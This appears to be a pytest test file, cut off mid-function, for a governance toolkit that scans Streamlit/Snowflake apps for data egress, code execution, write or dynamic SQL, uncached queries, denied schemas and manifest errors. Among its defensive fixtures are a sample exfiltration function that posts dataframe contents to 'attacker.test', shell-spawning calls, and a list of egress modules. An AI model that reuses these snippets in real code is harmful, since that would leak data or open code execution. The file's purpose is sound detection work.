"""Tests for the governance checks + the validate-app aggregate gate."""

from __future__ import annotations

import sys
from pathlib import Path

import pytest
import yaml

from streamsnow.config import Config
from streamsnow.policy import SchemaPolicy
from streamsnow.scaffolder import scaffold
from streamsnow.tools import (
    check_app_security,
    check_artifacts,
    check_bind_predicates,
    check_caching,
    check_page_imports,
    check_session_fallback,
    check_sql_tokens,
)
from streamsnow.tools.check_schema_refs import find_denied_refs
from streamsnow.tools.validate_app import validate_app

REPO_ROOT = Path(__file__).resolve().parent.parent
EXAMPLE = REPO_ROOT / "streamsnow.config.example.yaml"


def _cfg() -> Config:
    return Config.from_dict(yaml.safe_load(EXAMPLE.read_text()))


def _write(p: Path, text: str) -> Path:
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text)
    return p


def test_security_flags_egress_exec_and_dynamic_sql(tmp_path):
    # dynamic-sql is only a finding when the f-string is the SQL ARGUMENT to a
    # .sql()/.query() call — not a bare assignment (FP class D3).
    p = _write(
        tmp_path / "a.py",
        "import requests\nimport os\nos.system('x')\n"
        "def f(c, t):\n    return c.query(f'SELECT * FROM {t}')\n",
    )
    res = check_app_security.scan_paths([p])
    kinds = {f["kind"] for f in res["findings"]}
    assert not res["ok"]
    assert {"egress", "code-exec", "dynamic-sql"} <= kinds


def test_security_flags_write_sql(tmp_path):
    p = _write(tmp_path / "w.sql", "DELETE FROM analytics.t WHERE x=1\n")
    assert not check_app_security.scan_paths([p])["ok"]


def test_security_clean_on_readonly(tmp_path):
    p = _write(tmp_path / "ok.py", "import streamlit as st\nimport plotly.express as px\n")
    assert check_app_security.scan_paths([p])["ok"]


def test_bind_predicate_trap_flagged(tmp_path):
    p = _write(tmp_path / "q.sql", "SELECT 1 WHERE (:1 IS NULL OR col = :1)\n")
    assert not check_bind_predicates.scan_paths([p])["ok"]


def test_caching_flags_uncached_fetch_and_respects_noqa(tmp_path):
    bad = _write(
        tmp_path / "bad.py",
        "import streamlit as st\ndef load():\n    return st.connection('snowflake').query('SELECT 1')\n",
    )
    assert not check_caching.scan_paths([bad])["ok"]
    ok = _write(
        tmp_path / "ok.py",
        "import streamlit as st\n@st.cache_data(ttl=1800)\ndef load():\n    return st.connection('snowflake').query('SELECT 1')\n",
    )
    assert check_caching.scan_paths([ok])["ok"]
    noqa = _write(
        tmp_path / "n.py",
        "import streamlit as st\ndef load():  # noqa: cache-required\n    return st.connection('snowflake').query('SELECT 1')\n",
    )
    assert check_caching.scan_paths([noqa])["ok"]


def test_caching_flags_cache_data_without_ttl(tmp_path):
    nott = _write(
        tmp_path / "nott.py",
        "import streamlit as st\n@st.cache_data\ndef load():\n"
        "    return st.connection('snowflake').query('SELECT 1')\n",
    )
    res = check_caching.scan_paths([nott])
    assert not res["ok"]
    assert "without ttl" in res["findings"][0]["detail"]


def test_caching_flags_named_load_sql_loader(tmp_path):
    # render_sql / load_sql results are named queries that must be cached.
    bad = _write(
        tmp_path / "ld.py",
        "import streamlit as st\nfrom sql_loader import load_sql\n"
        "def fetch_x():\n    return st.connection('snowflake').query(load_sql('x'))\n",
    )
    assert not check_caching.scan_paths([bad])["ok"]


def test_caching_noqa_on_fetch_call_line(tmp_path):
    # noqa on the .query()/.sql() line (not just the def line) opts out — smoke tests
    # often carry it there (apps/test-streamlit-app/pages/overview.py pattern).
    nq = _write(
        tmp_path / "nq.py",
        "import streamlit as st\ndef load():\n    conn = st.connection('snowflake')\n"
        "    return conn.query('SELECT 1', ttl=0)  # noqa: cache-required\n",
    )
    assert check_caching.scan_paths([nq])["ok"]


def test_caching_skips_private_helper(tmp_path):
    # FP class D6: underscore-prefixed low-level helpers (_query_df, _run_query) must
    # not be flagged — the public loaders that call them carry the cache decorator.
    priv = _write(
        tmp_path / "priv.py",
        "import streamlit as st\ndef _query_df(sql):\n"
        "    return st.connection('snowflake').query(sql)\n",
    )
    assert check_caching.scan_paths([priv])["ok"]


def test_caching_skips_connection_session_factory(tmp_path):
    # FP class D6: a connection/session factory (get_session/_get_conn) returns a
    # handle but never calls .query()/.sql() to return data — not a fetch.
    fac = _write(
        tmp_path / "fac.py",
        "import streamlit as st\ndef get_session():\n    try:\n"
        "        from snowflake.snowpark.context import get_active_session\n"
        "        return get_active_session()\n    except Exception:\n"
        "        return st.connection('snowflake').session()\n",
    )
    assert check_caching.scan_paths([fac])["ok"]


def test_caching_skips_query_primitive_shim(tmp_path):
    # FP class D6: a connection-adapter method literally named query/sql defines the
    # fetch primitive (it does not consume a named query).
    shim = _write(
        tmp_path / "shim.py",
        "class SessionAdapter:\n    def query(self, sql, params=None, ttl=0):\n"
        "        return self._session.sql(sql, params=params).to_pandas()\n",
    )
    assert check_caching.scan_paths([shim])["ok"]


def test_caching_skips_generic_sql_executor(tmp_path):
    # FP class D6: a function that executes a runtime-built SQL string passed in
    # (fees_cortex.run_generated_sql) is a generic executor; cache belongs on the caller.
    ex = _write(
        tmp_path / "ex.py",
        "import streamlit as st\ndef run_generated_sql(statement):\n"
        "    limited = _wrap(statement)\n"
        "    return st.connection('snowflake').query(limited, ttl=0)\n",
    )
    assert check_caching.scan_paths([ex])["ok"]


def test_caching_flags_delegated_named_fetch_to_private_helper(tmp_path):
    # A public loader that hands a NAMED query to a private fetch helper must be
    # cached. The helper is private (never flagged on its own), so without the
    # delegation rule the cache requirement vanishes into the gap between them.
    bad = _write(
        tmp_path / "deld.py",
        "import streamlit as st\nfrom sql_loader import load_sql\n"
        "def _run_query(sql):\n    return st.connection('snowflake').query(sql)\n"
        "def load_metric():\n    return _run_query(load_sql('example_metric'))\n",
    )
    res = check_caching.scan_paths([bad])
    assert not res["ok"]
    # The PUBLIC caller is flagged — never the private helper.
    assert {f["func"] for f in res["findings"]} == {"load_metric"}


def test_caching_clean_when_delegated_loader_is_cached(tmp_path):
    ok = _write(
        tmp_path / "delok.py",
        "import streamlit as st\n"
        "def _run_query(sql):\n    return st.connection('snowflake').query(sql)\n"
        "@st.cache_data(ttl=1800)\ndef load_metric():\n    return _run_query('SELECT 1')\n",
    )
    assert check_caching.scan_paths([ok])["ok"]


def test_caching_skips_delegated_runtime_value(tmp_path):
    # Handing a private fetch helper a runtime value (a parameter), not a named
    # query, is the generic-executor pattern: the cache belongs on whoever builds
    # the named query, so the delegating function is not flagged.
    ex = _write(
        tmp_path / "delrt.py",
        "import streamlit as st\n"
        "def _run_query(sql):\n    return st.connection('snowflake').query(sql)\n"
        "def run(statement):\n    return _run_query(statement)\n",
    )
    assert check_caching.scan_paths([ex])["ok"]


def test_caching_skips_delegated_string_kwarg_that_is_not_sql(tmp_path):
    # A generic executor that tags its delegated call with an unrelated string
    # kwarg (query_tag="adhoc") must NOT be mistaken for a named-query load — only
    # the SQL-bearing argument counts.
    ex = _write(
        tmp_path / "tag.py",
        "import streamlit as st\n"
        "def _run_query(sql, query_tag=None):\n"
        "    return st.connection('snowflake').query(sql)\n"
        "def run(statement):\n    return _run_query(statement, query_tag='adhoc')\n",
    )
    assert check_caching.scan_paths([ex])["ok"]


def test_caching_flags_nested_delegation_chain(tmp_path):
    # public -> _run_query -> _execute (which calls .query). The intermediate
    # helper must be recognized transitively so the public loader is flagged.
    bad = _write(
        tmp_path / "chain.py",
        "import streamlit as st\nfrom sql_loader import load_sql\n"
        "def _execute(sql):\n    return st.connection('snowflake').query(sql).to_pandas()\n"
        "def _run_query(sql):\n    return _execute(sql)\n"
        "def load_products():\n    return _run_query(load_sql('products'))\n",
    )
    res = check_caching.scan_paths([bad])
    assert not res["ok"]
    assert {f["func"] for f in res["findings"]} == {"load_products"}


def test_caching_flags_named_query_via_local_variable(tmp_path):
    # The canonical loader idiom: sql assigned from load_sql(), then fetched.
    # Uncached -> must be flagged even though the .query() arg is a variable.
    bad = _write(
        tmp_path / "locvar.py",
        "import streamlit as st\nfrom sql_loader import load_sql\n"
        "def load_metric():\n    sql = load_sql('m')\n"
        "    return st.connection('snowflake').query(sql)\n",
    )
    assert not check_caching.scan_paths([bad])["ok"]
    ok = _write(
        tmp_path / "locvarok.py",
        "import streamlit as st\nfrom sql_loader import load_sql\n"
        "@st.cache_data(ttl=1800)\ndef load_metric():\n    sql = load_sql('m')\n"
        "    return st.connection('snowflake').query(sql)\n",
    )
    assert check_caching.scan_paths([ok])["ok"]


def test_caching_skips_runtime_built_sql_local(tmp_path):
    # A local assigned from a non-named source (sanitize) is a runtime statement;
    # the generic-executor guarantee must hold even with local-variable taint.
    ex = _write(
        tmp_path / "rtloc.py",
        "import streamlit as st\ndef _sanitize(x):\n    return x\n"
        "def run(user_input):\n    sql = _sanitize(user_input)\n"
        "    return st.connection('snowflake').query(sql)\n",
    )
    assert check_caching.scan_paths([ex])["ok"]


def test_caching_named_local_not_poisoned_by_nested_scope(tmp_path):
    # A nested function that rebinds the same name from a non-named source lives
    # in its own scope and must NOT poison the outer loader's named local — else
    # a real uncached named loader would slip through.
    bad = _write(
        tmp_path / "nest.py",
        "import streamlit as st\nfrom sql_loader import load_sql\n"
        "def load_metric():\n    sql = load_sql('m')\n"
        "    def _fmt(x):\n        sql = str(x)\n        return sql\n"
        "    return st.connection('snowflake').query(sql)\n",
    )
    res = check_caching.scan_paths([bad])
    assert not res["ok"]
    assert {f["func"] for f in res["findings"]} == {"load_metric"}


def test_caching_walk_skips_dotted_dirs(tmp_path):
    # The file walk must skip .review/, .git/, etc. and only scan real app files.
    _write(
        tmp_path / ".review" / "junk.py",
        "import streamlit as st\ndef load():\n"
        "    return st.connection('snowflake').query('SELECT 1')\n",
    )
    files = check_caching._iter_py_files(tmp_path)
    assert not any(".review" in str(f) for f in files)


def test_validate_app_passes_on_scaffold(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "good-app")
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/good-app", policy, cfg)
    assert res["ok"], res["checks"]


def test_validate_app_skips_dotted_tooling_dirs(tmp_path):
    """A REVIEW note under .review/ that quotes a denied schema must NOT trip the gate."""
    cfg = _cfg()
    scaffold(cfg, tmp_path, "clean-app")
    app = tmp_path / "apps/clean-app"
    # Tooling artifacts that quote denied schemas / dynamic SQL — never app source.
    _write(
        app / ".review/REVIEW-2026-01-01.md",
        "Found `SELECT * FROM RAW.secrets` and import requests\n",
    )
    _write(app / ".git/config", "[core]\n")
    _write(app / "pages/__pycache__/x.cpython-311.pyc", "junk\n")
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(app, policy, cfg)
    assert res["ok"], res["checks"]


def test_security_flags_python_write_sql_and_format_sql(tmp_path):
    w = _write(
        tmp_path / "w.py",
        "import streamlit as st\ndef f():\n    return st.connection('x').query('DELETE FROM analytics.t')\n",
    )
    assert any(x["kind"] == "write-sql" for x in check_app_security.scan_paths([w])["findings"])
    d = _write(
        tmp_path / "d.py", "def f(c, t):\n    return c.query('SELECT * FROM {}'.format(t))\n"
    )
    assert any(x["kind"] == "dynamic-sql" for x in check_app_security.scan_paths([d])["findings"])


# --------------------------------------------------------------------------- #
# app-security: dogfood false-positive regressions (each must NOT flag)       #
# --------------------------------------------------------------------------- #
def test_security_fstring_outside_query_call_not_flagged_fp_d3(tmp_path):
    # FP D3: an f-string carrying SQL words but passed to st.caption / st.markdown,
    # or returned as a render_sql token fragment, is NOT dynamic-sql. Only the SQL
    # argument of a .sql()/.query() call counts.
    p = _write(
        tmp_path / "fp.py",
        "import streamlit as st\n"
        "def render(t, quoted):\n"
        "    st.caption(f'SELECT {t} rows shown')\n"
        '    st.markdown(f"<p>WHERE clause: {t}</p>")\n'
        "    return (\n"
        "        'AND AGENT_ID IN (SELECT AGENT_ID FROM REF '\n"
        "        f'WHERE NAME IN ({quoted}))'\n"
        "    )\n",
    )
    assert check_app_security.scan_paths([p])["ok"]


def test_security_bare_name_sql_arg_allowed_fp_d3(tmp_path):
    # FP D3: a pre-built query variable (sess.sql(sql)) is allowed.
    p = _write(tmp_path / "bare.py", "def f(sess, sql):\n    return sess.sql(sql)\n")
    assert check_app_security.scan_paths([p])["ok"]


def test_security_plus_concat_sql_flagged_p4(tmp_path):
    # P4: string concatenation at the SQL call site (.sql('...' + x)) is dynamic-sql.
    p = _write(tmp_path / "concat.py", "def f(c, t):\n    return c.sql('SELECT 1 FROM t' + t)\n")
    assert any(x["kind"] == "dynamic-sql" for x in check_app_security.scan_paths([p])["findings"])


def test_noqa_only_waives_dynamic_sql(tmp_path):
    # The `noqa: dynamic-sql` pragma is the ONE sanctioned waiver (server-controlled
    # metadata commands). It must NOT be generalizable to silence egress /
    # code-exec / write-sql — those would be self-service security bypasses.
    ok = _write(
        tmp_path / "dyn.py",
        "def f(c, fqn):\n    return c.sql(f'DESC STREAMLIT {fqn}')  # noqa: dynamic-sql\n",
    )
    assert check_app_security.scan_paths([ok])["ok"]
    for snippet, kind in (
        ("import socket  # noqa: egress\n", "egress"),
        ("import os\nos.system('x')  # noqa: code-exec\n", "code-exec"),
        ("def f(c):\n    return c.query('DROP TABLE t')  # noqa: write-sql\n", "write-sql"),
    ):
        p = _write(tmp_path / f"{kind}.py", snippet)
        kinds = {x["kind"] for x in check_app_security.scan_paths([p])["findings"]}
        assert kind in kinds, f"{kind} must NOT be waivable via # noqa"


def test_cortex_rest_waiver_is_validated_not_blanket(tmp_path):
    # A valid Cortex Analyst shape passes; the same waiver abused to exfiltrate
    # (requests.post to an external URL) is flagged.
    valid = _write(
        tmp_path / "cortex_ok.py",
        "import os\nimport requests  # snowflake-cortex-rest\n"
        'SNOWFLAKE_HOST = os.environ["SNOWFLAKE_HOST"]\n'
        'CORTEX_ANALYST_ENDPOINT = "/api/v2/cortex/analyst/message"\n'
        'CORTEX_ANALYST_URL = f"https://{SNOWFLAKE_HOST}{CORTEX_ANALYST_ENDPOINT}"\n'
        "def _token():\n"
        '    with open("/snowflake/session/token") as fh:\n        return fh.read()\n'
        "def ask(payload):\n"
        "    return requests.post(CORTEX_ANALYST_URL, json=payload, headers={'Authorization': _token()})\n",
    )
    assert check_app_security.scan_paths([valid])["ok"], check_app_security.scan_paths([valid])[
        "findings"
    ]
    exfil = _write(
        tmp_path / "cortex_exfil.py",
        "import requests  # snowflake-cortex-rest\n"
        "def steal(df):\n    requests.post('https://attacker.test/x', json=df.to_dict())\n",
    )
    assert not check_app_security.scan_paths([exfil])["ok"]


def test_plain_requests_import_still_flagged(tmp_path):
    bad = _write(tmp_path / "plain.py", "import requests\n")
    assert any(x["kind"] == "egress" for x in check_app_security.scan_paths([bad])["findings"])


def test_security_egress_submodule_granularity_p5(tmp_path):
    # P5: harmless stdlib (urllib.parse, from http import HTTPStatus) is not egress;
    # ssl/websocket(s)/imaplib/pycurl/xmlrpc/poplib are.
    clean = _write(
        tmp_path / "clean.py",
        "import urllib.parse\nfrom http import HTTPStatus\nfrom urllib.parse import quote\n",
    )
    assert check_app_security.scan_paths([clean])["ok"]
    for mod in ("ssl", "websocket", "websockets", "imaplib", "pycurl", "xmlrpc", "poplib"):
        p = _write(tmp_path / f"{mod}_egress.py", f"import {mod}\n")
        assert any(x["kind"] == "egress" for x in check_app_security.scan_paths([p])["findings"]), (
            mod
        )


def test_security_exec_coverage_p6(tmp_path):
    # P6: os.execv*/os.spawn*, subprocess.getoutput/getstatusoutput, marshal.load(s),
    # pty.spawn are all code-exec.
    src = (
        "import os, subprocess, marshal, pty\n"
        "def f():\n"
        "    os.execv('a', [])\n"
        "    os.spawnv(0, 'a', [])\n"
        "    subprocess.getoutput('x')\n"
        "    subprocess.getstatusoutput('x')\n"
        "    marshal.loads(b'')\n"
        "    pty.spawn('sh')\n"
    )
    p = _write(tmp_path / "exec.py", src)
    n = sum(1 for x in check_app_security.scan_paths([p])["findings"] if x["kind"] == "code-exec")
    assert n == 6, n


def test_security_sql_write_noise_stripping_p2(tmp_path):
    # P2: write/DDL keywords inside comments, string literals, or AS-aliases in a
    # .sql file are NOT flagged; only statement-initial write verbs are.
    clean = _write(
        tmp_path / "clean.sql",
        "-- a comment with DELETE FROM t\n"
        "/* block CREATE TABLE x */\n"
        "SELECT col AS update_ts FROM t WHERE status = 'DELETED' AND note = 'please update';\n",
    )
    assert check_app_security.scan_paths([clean])["ok"]
    bad = _write(
        tmp_path / "bad.sql",
        "SELECT 1;\nDELETE FROM analytics.t WHERE x = 1;\nCREATE TABLE foo AS SELECT 1;\n",
    )
    kws = [
        x["detail"]
        for x in check_app_security.scan_paths([bad])["findings"]
        if x["kind"] == "write-sql"
    ]
    assert len(kws) == 2


def test_security_walk_skips_dotted_dirs(tmp_path):
    # The file walk must skip .review/, .git/, __pycache__ and only scan real app files.
    _write(tmp_path / "apps/x/.review/leak.py", "import requests\nimport os\nos.system('x')\n")
    _write(tmp_path / "apps/x/__pycache__/cached.py", "import requests\n")
    _write(tmp_path / "apps/x/streamlit_app.py", "import streamlit as st\n")
    assert check_app_security.main([str(tmp_path / "apps"), "--format", "json"]) == 0


def test_schema_refs_use_statement_and_read_exceptions():
    from streamsnow.policy import SchemaPolicy as SP

    policy = SP(database="DB", schema_allow=("ANALYTICS",), schema_deny=("RAW",))
    assert find_denied_refs("USE SCHEMA RAW;", policy)
    assert find_denied_refs("use schema raw", policy)
    exc = SP(
        database="DB",
        schema_allow=("ANALYTICS",),
        schema_deny=("RAW",),
        read_exceptions=("DB.RAW.SANCTIONED",),
    )
    assert not find_denied_refs("SELECT * FROM DB.RAW.SANCTIONED", exc)
    assert find_denied_refs("SELECT * FROM DB.RAW.OTHER", exc)


# --------------------------------------------------------------------------- #
# schema-refs: real detections must stay (.py SQL literals + .sql)            #
# --------------------------------------------------------------------------- #
def _deny_policy():
    from streamsnow.policy import SchemaPolicy as SP

    return SP(database="DB", schema_allow=("ANALYTICS", "REPORTING"), schema_deny=("BRIDGE", "RAW"))


def test_schema_refs_flags_real_sql_and_python_query():
    policy = _deny_policy()
    # .sql file: denied schema in a FROM clause.
    assert find_denied_refs("SELECT a FROM BRIDGE.T\n", policy)
    # .py: SQL literal passed to a query() call.
    assert find_denied_refs("conn.query('SELECT * FROM BRIDGE.T')", policy, is_python=True)
    # .py: SQL literal recognized by keyword even without a query() wrapper.
    assert find_denied_refs("sql = 'SELECT a FROM BRIDGE.T'", policy, is_python=True)


def test_schema_refs_reports_correct_multiline_literal_lineno():
    policy = _deny_policy()
    src = 'import streamlit\nx = 1\nsql = """\nSELECT a\nFROM BRIDGE.T\n"""\n'
    # BRIDGE is on file line 5 (inside the triple-quoted literal that opens on 3).
    assert find_denied_refs(src, policy, is_python=True) == [(5, "BRIDGE")]


# --------------------------------------------------------------------------- #
# schema-refs: dogfood false-positive regressions (each must NOT flag)        #
# --------------------------------------------------------------------------- #
def test_schema_refs_ignores_module_docstring_fp_d1():
    # FP D1: a denied schema named in a docstring documenting the ban.
    policy = _deny_policy()
    src = '"""Never query BRIDGE / RAW here; use the REPORTING passthrough."""\nimport os\n'
    assert find_denied_refs(src, policy, is_python=True) == []


def test_schema_refs_ignores_markdown_and_caption_prose_fp_d1():
    # FP D1: denied schema mentioned in st.markdown / st.caption prose (no SQL).
    policy = _deny_policy()
    md = (
        "import streamlit as st\n"
        'st.markdown("REPORTING-layer passthrough of `BRIDGE.VW_X`")\n'
        'st.caption("data flows RAW -> BRIDGE -> REPORTING")\n'
    )
    assert find_denied_refs(md, policy, is_python=True) == []


def test_schema_refs_two_part_tests_only_schema_position_fp_d2():
    # FP D2: only the schema-position segment is tested against the denylist.
    policy = _deny_policy()
    # BRIDGE in the *database* / trailing-object position -> not a hit.
    assert find_denied_refs("SELECT * FROM DB.BRIDGE", policy) == []
    # BRIDGE in the *schema* position (2-part SCHEMA.OBJECT) -> hit.
    assert find_denied_refs("SELECT * FROM BRIDGE.FOO", policy)
    # 3-part DB.SCHEMA.OBJECT tests the middle (schema) segment.
    assert find_denied_refs("SELECT * FROM DB.BRIDGE.T", policy)
    # An allowed schema in a 3-part ref is clean even with a noisy DB name.
    assert find_denied_refs("SELECT * FROM BI.REPORTING.VW", policy) == []


def test_schema_refs_check_paths_skips_dotted_dirs(tmp_path):
    from streamsnow.policy import SchemaPolicy as SP
    from streamsnow.tools.check_schema_refs import check_paths

    policy = SP(database="DB", schema_allow=("ANALYTICS",), schema_deny=("BRIDGE",))
    # A real review artifact under a dotted dir (.review/) must be skipped.
    review = _write(tmp_path / "apps/x/.review/stub.sql", "SELECT * FROM BRIDGE.T\n")
    # A real query under apps/x/queries must still be flagged.
    real = _write(tmp_path / "apps/x/queries/q.sql", "SELECT * FROM BRIDGE.T\n")
    res = check_paths([review, real], policy)
    files = {f["file"] for f in res["findings"]}
    assert str(real) in files
    assert str(review) not in files
    assert not res["ok"]


def test_validate_app_fails_on_invalid_manifest(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "m-app")
    (tmp_path / "apps/m-app/snowflake.yml").write_text("entities: [oops\n")  # invalid YAML
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/m-app", policy, cfg)
    by_name = {c["name"]: c["ok"] for c in res["checks"]}
    assert by_name["manifest"] is False
    assert res["ok"] is False


def test_validate_app_fails_on_violations(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "bad-app")
    _write(tmp_path / "apps/bad-app/pages/leak.py", "import requests\n")
    _write(tmp_path / "apps/bad-app/queries/bad.sql", "SELECT * FROM RAW.secrets\n")
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/bad-app", policy, cfg)
    by_name = {c["name"]: c["ok"] for c in res["checks"]}
    assert res["ok"] is False
    assert by_name["app-security"] is False
    assert by_name["schema-refs"] is False


# --------------------------------------------------------------------------- #
# Manifest runtime-rule regression tests (ported from validate_yaml.py).
# --------------------------------------------------------------------------- #
def _manifest(app_dir: Path):
    cfg = _cfg()
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(app_dir, policy, cfg)
    return {c["name"]: c for c in res["checks"]}, res


def test_manifest_container_missing_compute_pool_fails(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "c-app")
    yml = tmp_path / "apps/c-app/snowflake.yml"
    data = yaml.safe_load(yml.read_text())
    ent = next(iter(data["entities"].values()))
    del ent["compute_pool"]
    yml.write_text(yaml.safe_dump(data))
    by_name, res = _manifest(tmp_path / "apps/c-app")
    assert by_name["manifest"]["ok"] is False
    assert any("compute_pool" in p for p in by_name["manifest"]["findings"])
    assert res["ok"] is False


def test_manifest_container_wrong_runtime_name_fails(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "c2-app")
    yml = tmp_path / "apps/c2-app/snowflake.yml"
    data = yaml.safe_load(yml.read_text())
    ent = next(iter(data["entities"].values()))
    ent["runtime_name"] = "SYSTEM$WRONG_RUNTIME"
    yml.write_text(yaml.safe_dump(data))
    by_name, _ = _manifest(tmp_path / "apps/c2-app")
    assert by_name["manifest"]["ok"] is False
    assert any("runtime_name" in p for p in by_name["manifest"]["findings"])


def test_manifest_warehouse_with_compute_pool_fails(tmp_path):
    # Warehouse runtime, but a stray container-only field leaks in.
    data = yaml.safe_load(EXAMPLE.read_text())
    data["runtime"] = "warehouse"
    data["snowflake"]["objects"] = dict(data["snowflake"]["objects"])
    data["snowflake"]["objects"]["compute_pool"] = ""
    data["snowflake"]["objects"]["external_access_integration"] = ""
    cfg = Config.from_dict(data)
    scaffold(cfg, tmp_path, "w-app")
    yml = tmp_path / "apps/w-app/snowflake.yml"
    ydata = yaml.safe_load(yml.read_text())
    ent = next(iter(ydata["entities"].values()))
    ent["compute_pool"] = "STREAMLIT_POOL"  # forbidden in warehouse mode
    yml.write_text(yaml.safe_dump(ydata))
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/w-app", policy, cfg)
    by_name = {c["name"]: c for c in res["checks"]}
    assert by_name["manifest"]["ok"] is False
    assert any("compute_pool" in p for p in by_name["manifest"]["findings"])


def test_manifest_warehouse_env_yml_python_pin_fails(tmp_path):
    data = yaml.safe_load(EXAMPLE.read_text())
    data["runtime"] = "warehouse"
    data["snowflake"]["objects"] = dict(data["snowflake"]["objects"])
    data["snowflake"]["objects"]["compute_pool"] = ""
    data["snowflake"]["objects"]["external_access_integration"] = ""
    cfg = Config.from_dict(data)
    scaffold(cfg, tmp_path, "wpy-app")
    env = tmp_path / "apps/wpy-app/environment.yml"
    edata = yaml.safe_load(env.read_text())
    edata["dependencies"].append("python=3.11")  # the CREATE STREAMLIT landmine
    env.write_text(yaml.safe_dump(edata))
    policy = SchemaPolicy.from_governance(cfg.governance)
    res = validate_app(tmp_path / "apps/wpy-app", policy, cfg)
    by_name = {c["name"]: c for c in res["checks"]}
    assert by_name["manifest"]["ok"] is False
    assert any("python" in p for p in by_name["manifest"]["findings"])


def test_manifest_definition_version_must_be_2(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "dv-app")
    yml = tmp_path / "apps/dv-app/snowflake.yml"
    data = yaml.safe_load(yml.read_text())
    data["definition_version"] = 1
    yml.write_text(yaml.safe_dump(data))
    by_name, _ = _manifest(tmp_path / "apps/dv-app")
    assert by_name["manifest"]["ok"] is False
    assert any("definition_version" in p for p in by_name["manifest"]["findings"])


def test_manifest_query_warehouse_must_be_allowed(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "qw-app")
    yml = tmp_path / "apps/qw-app/snowflake.yml"
    data = yaml.safe_load(yml.read_text())
    ent = next(iter(data["entities"].values()))
    ent["query_warehouse"] = "SOME_RANDOM_WH"
    yml.write_text(yaml.safe_dump(data))
    by_name, _ = _manifest(tmp_path / "apps/qw-app")
    assert by_name["manifest"]["ok"] is False
    assert any("query_warehouse" in p for p in by_name["manifest"]["findings"])


def _warehouse_cfg() -> Config:
    """Example config flipped to warehouse runtime (drops container-only fields)."""
    data = yaml.safe_load(EXAMPLE.read_text())
    data["runtime"] = "warehouse"
    data["snowflake"]["objects"] = dict(data["snowflake"]["objects"])
    data["snowflake"]["objects"]["compute_pool"] = ""
    data["snowflake"]["objects"]["external_access_integration"] = ""
    return Config.from_dict(data)


def test_manifest_container_pyproject_missing_required_dep_fails(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "pp-app")
    # Valid TOML, valid python, but missing snowflake-snowpark-python.
    (tmp_path / "apps/pp-app/pyproject.toml").write_text(
        '[project]\nname = "pp-app"\nrequires-python = ">=3.11,<3.12"\n'
        'dependencies = ["streamlit==1.50.0"]\n'
    )
    by_name, res = _manifest(tmp_path / "apps/pp-app")
    assert by_name["manifest"]["ok"] is False
    assert any("snowflake-snowpark-python" in p for p in by_name["manifest"]["findings"])
    assert res["ok"] is False


def test_manifest_container_pyproject_wrong_python_fails(tmp_path):
    cfg = _cfg()
    scaffold(cfg, tmp_path, "ppy-app")
    # Pinned to 3.10 only — does not allow the container's 3.11.
    (tmp_path / "apps/ppy-app/pyproject.toml").write_text(
        '[project]\nname = "ppy-app"\nrequires-python = "==3.10.*"\n'
        'dependencies = ["streamlit==1.50.0", "snowflake-snowpark-python"]\n'
    )
    by_name, _ = _manifest(tmp_path / "apps/ppy-app")
    assert by_name["manifest"]["ok"] is False
    assert any("requires-python" in p for p in by_name["manifest"]["findings"])


def test_manifest_container_pyproject_broad_python_passes(tmp_path):
    # PEP 440 semantics: '>=3.10' ALLOWS 3.11, so it must NOT be flagged. The old
    # naive token match wrongly rejected it (3.11 token absent from the string).
    cfg = _cfg()
    scaffold(cfg, tmp_path, "pbroad-app")
    (tmp_path / "apps/pbroad-app/pyproject.toml").write_text(
        '[project]\nname = "pbroad-app"\nrequires-python = ">=3.10"\n'
        'dependencies = ["streamlit==1.50.0", "snowflake-snowpark-python"]\n'
    )
    by_name, _ = _manifest(tmp_path / "apps/pbroad-app")
    assert by_name["manifest"]["ok"] is True, by_name["manifest"]["findings"]


def test_manifest_container_pyproject_excludes_311_fails(tmp_path):
    # '>=3.10,<3.11' contains the token '3.11' but does NOT allow Python 3.11. The
    # old naive token match wrongly passed it; PEP 440 semantics catch it.
    cfg = _cfg()
    scaffold(cfg, tmp_path, "pex-app")
    (tmp_path / "apps/pex-app/pyproject.toml").write_text(
        '[project]\nname = "pex-app"\nrequires-python = ">=3.10,<3.11"\n'
        'dependencies = ["streamlit==1.50.0", "snowflake-snowpark-python"]\n'
    )
    by_name, _ = _manifest(tmp_path / "apps/pex-app")
    assert by_name["manifest"]["ok"] is False
    assert any("requires-python" in p for p in by_name["manifest"]["findings"])


def test_manifest_container_pyproject_missing_name_fails(tmp_path):
    # Source parity: [project].name is required.
    cfg = _cfg()
    scaffold(cfg, tmp_path, "pnm-app")
    (tmp_path / "apps/pnm-app/pyproject.toml").write_text(
        '[project]\nrequires-python = ">=3.11,<3.12"\n'
        'dependencies = ["streamlit==1.50.0", "snowflake-snowpark-python"]\n'
    )
    by_name, _ = _manifest(tmp_path / "apps/pnm-app")
    assert by_name["manifest"]["ok"] is False
    assert any("name" in p for p in by_name["manifest"]["findings"])


def test_manifest_container_pyproject_noncanonical_dep_name_ok(tmp_path):
    # PEP 503: 'snowflake_snowpark_python' (underscores) is equivalent to the
    # canonical hyphenated name and must NOT be reported as a missing package.
    cfg = _cfg()
    scaffold(cfg, tmp_path, "puc-app")
    (tmp_path / "apps/puc-app/pyproject.toml").write_text(
        '[project]\nname = "puc-app"\nrequires-python = ">=3.11,<3.12"\n'
        'dependencies = ["Streamlit==1.50.0", "snowflake_snowpark_python"]\n'
    )
    by_name, _ = _manifest(tmp_path / "apps/puc-app")
    assert by_name["manifest"]["ok"] is True, by_name["manifest"]["findings"]


def test_manifest_container_pyproject_malformed_python_fails(tmp_path):
    # A requires-python packaging can't parse is not a valid pin -> fail closed.
    cfg = _cfg()
    scaffold(cfg, tmp_path, "pmal-app")
